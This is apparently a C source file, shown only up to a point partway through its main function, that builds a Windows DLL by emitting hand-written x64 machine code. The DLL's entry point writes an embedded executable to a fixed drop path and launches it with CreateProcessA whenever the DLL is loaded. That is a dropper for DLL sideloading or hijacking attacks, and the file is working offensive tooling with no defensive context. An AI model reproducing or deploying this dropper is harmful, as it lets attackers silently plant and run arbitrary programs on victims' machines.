#define _GNU_SOURCE
#include "config.h"
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

struct launcher_buffer {
    unsigned char *data;
    size_t length;
    size_t capacity;
};

static int launcher_reserve(struct launcher_buffer *buffer, size_t extra)
{
    size_t needed;
    size_t capacity;
    unsigned char *data;

    if (extra > (size_t)-1 - buffer->length)
        return -1;
    needed = buffer->length + extra;
    if (needed <= buffer->capacity)
        return 0;
    capacity = buffer->capacity ? buffer->capacity : 512;
    while (capacity < needed) {
        if (capacity > (size_t)-1 / 2) {
            capacity = needed;
            break;
        }
        capacity *= 2;
    }
    data = realloc(buffer->data, capacity);
    if (!data)
        return -1;
    buffer->data = data;
    buffer->capacity = capacity;
    return 0;
}

static int launcher_append(struct launcher_buffer *buffer,
                           const void *data, size_t length)
{
    if (launcher_reserve(buffer, length) < 0)
        return -1;
    if (length)
        memcpy(buffer->data + buffer->length, data, length);
    buffer->length += length;
    return 0;
}

static int launcher_append_zero(struct launcher_buffer *buffer, size_t length)
{
    if (launcher_reserve(buffer, length) < 0)
        return -1;
    memset(buffer->data + buffer->length, 0, length);
    buffer->length += length;
    return 0;
}

static int launcher_emit8(struct launcher_buffer *buffer, unsigned char value)
{
    return launcher_append(buffer, &value, 1);
}

static int launcher_emit32(struct launcher_buffer *buffer, uint32_t value)
{
    unsigned char bytes[4];

    bytes[0] = (unsigned char)value;
    bytes[1] = (unsigned char)(value >> 8);
    bytes[2] = (unsigned char)(value >> 16);
    bytes[3] = (unsigned char)(value >> 24);
    return launcher_append(buffer, bytes, sizeof(bytes));
}

static void launcher_put16(unsigned char *data, size_t offset, uint16_t value)
{
    data[offset] = (unsigned char)value;
    data[offset + 1] = (unsigned char)(value >> 8);
}

static void launcher_put32(unsigned char *data, size_t offset, uint32_t value)
{
    data[offset] = (unsigned char)value;
    data[offset + 1] = (unsigned char)(value >> 8);
    data[offset + 2] = (unsigned char)(value >> 16);
    data[offset + 3] = (unsigned char)(value >> 24);
}

static void launcher_put64(unsigned char *data, size_t offset, uint64_t value)
{
    launcher_put32(data, offset, (uint32_t)value);
    launcher_put32(data, offset + 4, (uint32_t)(value >> 32));
}

static int launcher_align(struct launcher_buffer *buffer, size_t alignment)
{
    size_t remainder = buffer->length % alignment;
    return remainder ? launcher_append_zero(buffer, alignment - remainder) : 0;
}

static int launcher_patch_rel32(struct launcher_buffer *buffer,
                                size_t displacement_offset, size_t target_offset)
{
    int64_t displacement = (int64_t)target_offset -
                           (int64_t)(displacement_offset + 4);

    if (displacement < INT32_MIN || displacement > INT32_MAX)
        return -1;
    launcher_put32(buffer->data, displacement_offset, (uint32_t)(int32_t)displacement);
    return 0;
}

static int launcher_add_import_name(struct launcher_buffer *section,
                                    const char *name, size_t *name_offset)
{
    unsigned char hint[2] = { 0, 0 };

    if (launcher_align(section, 2) < 0)
        return -1;
    *name_offset = section->length;
    if (launcher_append(section, hint, sizeof(hint)) < 0 ||
        launcher_append(section, name, strlen(name) + 1) < 0)
        return -1;
    return 0;
}

int build_launcher_dll(const char *binary_path, const char *dll_out_path)
{
    static const unsigned char dos_stub[64] = {
        0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
        0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00
    };
    static const unsigned char section_name[8] =
        { '.', 'a', 'l', 'l', 0, 0, 0, 0 };
    static const char *import_names[4] = {
        "CreateFileA", "WriteFile", "CloseHandle", "CreateProcessA"
    };
    struct launcher_buffer section = { 0 };
    unsigned char *binary = NULL;
    unsigned char *image = NULL;
    struct stat st;
    size_t import_name_offsets[4];
    size_t code_length;
    size_t path_offset;
    size_t binary_offset;
    size_t descriptor_offset;
    size_t int_offset;
    size_t iat_offset;
    size_t dll_name_offset;
    size_t reloc_offset;
    size_t raw_size;
    size_t image_size;
    size_t file_size;
    size_t cursor;
    size_t fix_path_create;
    size_t fix_path_process;
    size_t fix_binary;
    size_t fix_iat_create_file;
    size_t fix_iat_write_file;
    size_t fix_iat_close_handle;
    size_t fix_iat_create_process;
    size_t branch_not_attach;
    size_t branch_no_write;
    size_t label_no_write;
    size_t label_return_true;
    uint32_t binary_length;
    uint32_t section_virtual_size;
    uint32_t section_raw_size;
    uint32_t size_of_image;
    uint32_t import_rva;
    uint32_t import_size;
    uint32_t iat_rva;
    uint32_t iat_size;
    uint32_t reloc_rva;
    const char *drop_path = DROP_PATH;
    size_t drop_path_length;
    int input_fd = -1;
    int output_fd = -1;
    int result = -1;
    size_t read_offset;
    size_t written_offset;

    if (!binary_path || !dll_out_path || !drop_path)
        return -1;
    drop_path_length = strlen(drop_path) + 1;

    input_fd = open(binary_path, O_RDONLY);
    if (input_fd < 0)
        goto done;
    if (fstat(input_fd, &st) < 0 || st.st_size < 0 ||
        (uint64_t)st.st_size > UINT32_MAX)
        goto done;
    binary_length = (uint32_t)st.st_size;
    binary = malloc(binary_length ? (size_t)binary_length : 1);
    if (!binary)
        goto done;
    read_offset = 0;
    while (read_offset < (size_t)binary_length) {
        ssize_t count = read(input_fd, binary + read_offset,
                             (size_t)binary_length - read_offset);
        if (count < 0) {
            if (errno == EINTR)
                continue;
            goto done;
        }
        if (count == 0)
            goto done;
        read_offset += (size_t)count;
    }
    if (close(input_fd) < 0) {
        input_fd = -1;
        goto done;
    }
    input_fd = -1;

    /* DllMain: only perform the launch work for DLL_PROCESS_ATTACH. */
    if (launcher_append(&section, "\x83\xfa\x01", 3) < 0 ||
        launcher_append(&section, "\x0f\x85", 2) < 0)
        goto done;
    branch_not_attach = section.length;
    if (launcher_emit32(&section, 0) < 0)
        goto done;

    /* Reserve shadow space and locals, then zero STARTUPINFOA and
       PROCESS_INFORMATION. */
    if (launcher_append(&section, "\x48\x81\xec\xe8\x00\x00\x00", 7) < 0 ||
        launcher_append(&section, "\x31\xc0", 2) < 0 ||
        launcher_append(&section, "\x4c\x8d\x54\x24\x60", 5) < 0 ||
        launcher_append(&section, "\xb9\x80\x00\x00\x00", 5) < 0)
        goto done;
    cursor = section.length;
    if (launcher_append(&section, "\x41\x88\x02\x49\xff\xc2\xff\xc9\x0f\x85",
                        10) < 0)
        goto done;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_patch_rel32(&section, cursor + 10, cursor) < 0)
        goto done;
    if (launcher_append(&section, "\xc7\x44\x24\x60\x68\x00\x00\x00", 8) < 0)
        goto done;

    /* CreateFileA(DROP_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
       FILE_ATTRIBUTE_NORMAL, NULL). */
    if (launcher_append(&section, "\x48\x8d\x0d", 3) < 0)
        goto done;
    fix_path_create = section.length;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_append(&section, "\xba\x00\x00\x00\x40\x45\x31\xc0"
                                  "\x4d\x31\xc9"
                                  "\xc7\x44\x24\x20\x02\x00\x00\x00"
                                  "\xc7\x44\x24\x28\x80\x00\x00\x00"
                                  "\x48\xc7\x44\x24\x30\x00\x00\x00\x00"
                                  "\xff\x15", 44) < 0)
        goto done;
    fix_iat_create_file = section.length;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_append(&section, "\x48\x89\x84\x24\xe0\x00\x00\x00"
                                  "\x48\x83\xf8\xff"
                                  "\x0f\x84", 18) < 0)
        goto done;
    branch_no_write = section.length;
    if (launcher_emit32(&section, 0) < 0)
        goto done;

    /* WriteFile(handle, embedded bytes, length, &written, NULL). */
    if (launcher_append(&section, "\x48\x8b\x8c\x24\xe0\x00\x00\x00"
                                  "\x48\x8d\x15", 11) < 0)
        goto done;
    fix_binary = section.length;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_append(&section, "\x41\xb8", 2) < 0 ||
        launcher_emit32(&section, binary_length) < 0 ||
        launcher_append(&section, "\x4c\x8d\x4c\x24\x58"
                                  "\x48\xc7\x44\x24\x20\x00\x00\x00\x00"
                                  "\xff\x15", 17) < 0)
        goto done;
    fix_iat_write_file = section.length;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_append(&section, "\x48\x8b\x8c\x24\xe0\x00\x00\x00"
                                  "\xff\x15", 10) < 0)
        goto done;
    fix_iat_close_handle = section.length;
    if (launcher_emit32(&section, 0) < 0)
        goto done;

    label_no_write = section.length;

    /* CreateProcessA(DROP_PATH, NULL, NULL, NULL, FALSE, 0, NULL, NULL,
       &startup_info, &process_information). */
    if (launcher_append(&section, "\x48\x8d\x0d", 3) < 0)
        goto done;
    fix_path_process = section.length;
    if (launcher_emit32(&section, 0) < 0 ||
        launcher_append(&section, "\x31\xd2\x45\x31\xc0\x4d\x31\xc9"
                                  "\x48\xc7\x44\x24\x20\x00\x00\x00\x00"
                                  "\x48\xc7\x44\x24\x28\x00\x00\x00\x00"
                                  "\x48\xc7\x44\x24\x30\x00\x00\x00\x00"
                                  "\x48\xc7\x44\x24\x38\x00\x00\x00\x00"